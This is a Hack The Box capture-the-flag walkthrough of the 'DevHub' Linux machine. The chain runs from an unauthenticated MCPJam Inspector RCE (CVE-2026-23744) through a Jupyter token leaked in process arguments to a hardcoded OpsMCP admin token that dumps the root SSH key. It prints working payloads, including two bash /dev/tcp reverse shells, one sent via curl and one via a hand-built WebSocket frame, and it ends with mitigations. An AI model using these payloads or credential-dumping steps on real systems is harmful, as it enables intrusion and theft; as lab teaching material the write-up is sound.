---
title: "HTB Walkthrough: DevHub"
date: 2026-10-10
draft: false
description: "Full walkthrough of the DevHub machine from Hack The Box. Medium difficulty, Linux. CVE-2026-23744 on MCPJam Inspector → Jupyter token exposed in process arguments → WebSocket terminal RCE as analyst → hardcoded admin_token in OpsMCP → SSH root key dump via API → SSH access as root."
tags: ["HackTheBox", "Linux", "Medium", "MCPJam", "CVE-2026-23744", "MCP", "JupyterLab", "WebSocket", "RCE", "OpsMCP", "SSH", "HardcodedCredentials", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **DevHub** on Hack The Box. **Medium** difficulty machine running **Linux**. Port 6274 exposes a **MCPJam Inspector 1.4.2** vulnerable to **CVE-2026-23744**: the `/api/mcp/connect` endpoint spawns processes without validating the `command` field, allowing unauthenticated RCE. From the shell as `mcp-dev`, `ps aux` reveals a **Jupyter Lab** on `127.0.0.1:8888` with the **authentication token in plaintext** in the process arguments. A WebSocket connection to `/terminals/websocket/1` with that token gives a shell as `analyst`. As `analyst`, the source code of an **OpsMCP** server running as root contains a hardcoded `admin_token`; using it, calling `ops._admin_dump` returns the **root SSH private key** in cleartext.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                                                          |
|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | DevHub                                                                                                                                                           |
| **OS**         | Linux (Ubuntu)                                                                                                                                                   |
| **Difficulty** | Medium                                                                                                                                                           |
| **IP**         | 10.129.6.113                                                                                                                                                     |
| **Techniques** | CVE-2026-23744 MCPJam RCE · Jupyter token in `/proc` · WebSocket terminal RCE · OpsMCP hardcoded token · SSH key dump via API                                   |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.6.113
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```

### 1.2 Version and Script Detection

```bash
nmap -sC -sV -p22,80,6274 10.129.6.113
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  http    (MCPJam Inspector)
|_http-title: MCPJam Inspector
```

```bash
echo "10.129.6.113 devhub.htb" >> /etc/hosts
```

> **💡 Attack surface:** three relevant services — SSH for later access, nginx on port 80 with virtual host `devhub.htb`, and a **MCPJam Inspector** on port 6274. MCPJam Inspector is an open-source tool for inspecting and testing MCP (Model Context Protocol) servers — the protocol AI agents like Claude use to interact with external tools.

---

## 2. Vulnerability Identified — CVE-2026-23744

Browsing to `http://10.129.6.113:6274` confirms **MCPJam Inspector version 1.4.2**.

> **⚠️ Vulnerable version:** MCPJam Inspector **1.4.2** is vulnerable to **CVE-2026-23744**. The `/api/mcp/connect` endpoint accepts a `serverConfig` object with a `command` field that is passed directly to `child_process.spawn()` without any validation or authentication. Any client can execute arbitrary OS commands.

---

## 3. Exploitation — CVE-2026-23744 (MCPJam Inspector RCE)

The `/api/mcp/connect` endpoint receives a `serverConfig` describing how to launch a local MCP server. MCPJam uses it to call `child_process.spawn()` with the `command` and `args` the attacker controls.

```bash
nc -lvnp 4444
```

```bash
curl http://10.129.6.113:6274/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.211/4444 0>&1"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

```
Normal flow:    serverConfig describes a legitimate MCP server → spawn(command, args) starts the MCP process
Malicious flow: command=bash + args=[reverse shell] → spawn() executes the shell directly
                → outbound connection → shell as mcp-dev
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.6.113 40350
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

---

## 4. Lateral Movement — Jupyter Token Exposed in Process Arguments

### 4.1 Token Discovery

```bash
ps aux | grep jupyter
```

```
analyst  1038  /home/analyst/jupyter-env/bin/python3
         /home/analyst/jupyter-env/bin/jupyter-lab
         --ip=127.0.0.1
         --port=8888
         --no-browser
         --notebook-dir=/home/analyst/notebooks
         --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
         --ServerApp.password=
         --ServerApp.disable_check_xsrf=False

root     1045  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

> **💡 Key finding:** the Jupyter Lab authentication token is visible in plaintext in the process arguments — readable by any user via `/proc`. Token: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`. A second process, the **OpsMCP server**, is running as **root** — the vector for later escalation.

### 4.2 Token Validation

```bash
curl -s http://127.0.0.1:8888/api \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

```json
{"version": "2.17.0"}
```

Token valid — full access to the Jupyter Lab API as `analyst`.

### 4.3 WebSocket RCE via Jupyter Terminal

Jupyter Lab exposes interactive terminals at `/terminals/websocket/<id>`. Connecting with the token gives a terminal executing commands as `analyst`:

```bash
nc -lvnp 4445
```

```python
python3 - <<'EOF'
import socket, base64, os, time, json

token = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))

key = base64.b64encode(os.urandom(16)).decode()
handshake = (
    "GET /terminals/websocket/1 HTTP/1.1\r\n"
    "Host: 127.0.0.1:8888\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    f"Authorization: token {token}\r\n"
    "\r\n"
)
s.send(handshake.encode())
time.sleep(1)
s.recv(4096)

payload  = json.dumps(["stdin", "bash -i >& /dev/tcp/10.10.14.211/4445 0>&1\n"]).encode()
mask_key = os.urandom(4)
masked   = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
frame    = b'\x81' + bytes([0x80 | len(masked)]) + mask_key + masked
s.send(frame)

time.sleep(2)
s.close()
EOF
```

```
Connection received on 10.129.6.113 43744
analyst@devhub:~$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. User Flag

```bash
cat /home/analyst/user.txt
```

> 🔑 User flag obtained.

---

## 6. Privilege Enumeration — OpsMCP Server

```bash
cat /opt/opsmcp/server.py
```

The source code contains hardcoded tokens:

```python
elif target == "tokens":
    return jsonify({
        "target": "tokens",
        "api_tokens": {
            "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
            "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
        }
    })
```

> **⚠️ Credentials in source code:** tokens are hardcoded in the Python script. The server runs as root and is bound to `127.0.0.1:5000` — only accepts local connections, but as `analyst` we are on the same machine.

---

## 7. Privilege Escalation — Root SSH Key Dump via OpsMCP API

### 7.1 Dump the Root SSH Key

The OpsMCP server exposes the `ops._admin_dump` tool which, with the `admin_token` and `target=ssh_keys`, returns the root SSH private key. The process runs as root with access to `/root/.ssh/`:

```bash
curl -H "X-API-Key: opsmcp_admin_7f3b9c2d1e4f5a6b" \
  -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

```json
{
  "note": "Emergency recovery key dump",
  "target": "ssh_keys",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA...\n-----END OPENSSH PRIVATE KEY-----\n"
}
```

```
Normal flow:    OpsMCP API exposes management tools → token + IP origin authentication
Malicious flow: admin_token hardcoded in source → ops._admin_dump returns root RSA private key
                → ssh -i root_key root@localhost → shell as root
```

> **⚠️ Critical exposure:** an API that returns SSH private keys in plaintext JSON is equivalent to publishing the key world-readable. IP origin filtering is not authentication.

### 7.2 Connect as Root with the Extracted Key

```bash
cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[key extracted from JSON response]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/root_key
ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@localhost
```

```
root@devhub:~#
```

---

## 8. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 9. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap reveals ports 22, 80 and 6274. Port 6274 serves MCPJam Inspector 1.4.2.
2. **CVE-2026-23744** → `/api/mcp/connect` without validation → `command=bash` + reverse shell in `args` → shell as `mcp-dev`.
3. **Jupyter token** → `ps aux` exposes the Jupyter Lab token in process arguments → `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`.
4. **WebSocket terminal** → connection to `/terminals/websocket/1` with the token → `["stdin", "bash -i >& /dev/tcp/..."]` → shell as `analyst`.
5. **User flag** → `/home/analyst/user.txt`.
6. **OpsMCP** → `/opt/opsmcp/server.py` (root) contains hardcoded `admin_token` → `POST /tools/call` with `ops._admin_dump` + `target=ssh_keys`.
7. **Root** → root SSH private key in JSON response → `ssh -i root_key root@localhost`.

**What I learned from this machine:**

- **CVE-2026-23744 illustrates the inherent risk of AI agent debugging tools exposed on the network.** MCPJam Inspector is designed to test MCP servers — its legitimate functionality requires launching processes. Without authentication, that functionality is direct RCE. No debugging tool should be exposed on the network without authentication, especially if its core function involves process execution.

- **Process arguments are readable by all local users.** On Linux, `/proc/<pid>/cmdline` is readable by any user on the system. Passing secrets like tokens or passwords as command-line arguments exposes them to all local users. Secrets must always be passed via environment variables or configuration files with restrictive permissions.

- **Jupyter Lab's WebSocket terminal endpoint is a full shell.** The `/terminals/websocket/1` endpoint with a valid token is functionally equivalent to an SSH shell. A compromised Jupyter token is a full compromise of the account running it.

- **Hardcoded tokens in source code are exposed credentials.** The `server.py` file was readable by `analyst`. Any secret appearing in source code must be considered compromised from the moment more than one person has read access to the repository or filesystem. Secrets belong in secret managers or environment variables, never in code.

- **An API endpoint that returns SSH private keys has no secure design justification.** No service should expose private cryptographic material via an API, regardless of the authentication it uses. The root SSH key should be inaccessible from any process other than the OS itself.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| CVE-2026-23744 — MCPJam pre-auth RCE | Update MCPJam; never expose debug/inspection tools on the network without strong authentication |
| Jupyter token exposed in process arguments | Pass the token via a configuration file with `600` permissions; never as a CLI argument |
| Hardcoded admin token in `server.py` | Use environment variables or a secrets manager; never include credentials in source code |
| OpsMCP with IP filtering as the only access control | Implement real authentication in addition to IP filtering; IP origin filtering is not authentication |
| Endpoint returning root SSH private key in JSON | Never expose private keys via APIs; use CA-signed certificates instead of static keys; remove any "emergency key dump" functionality |
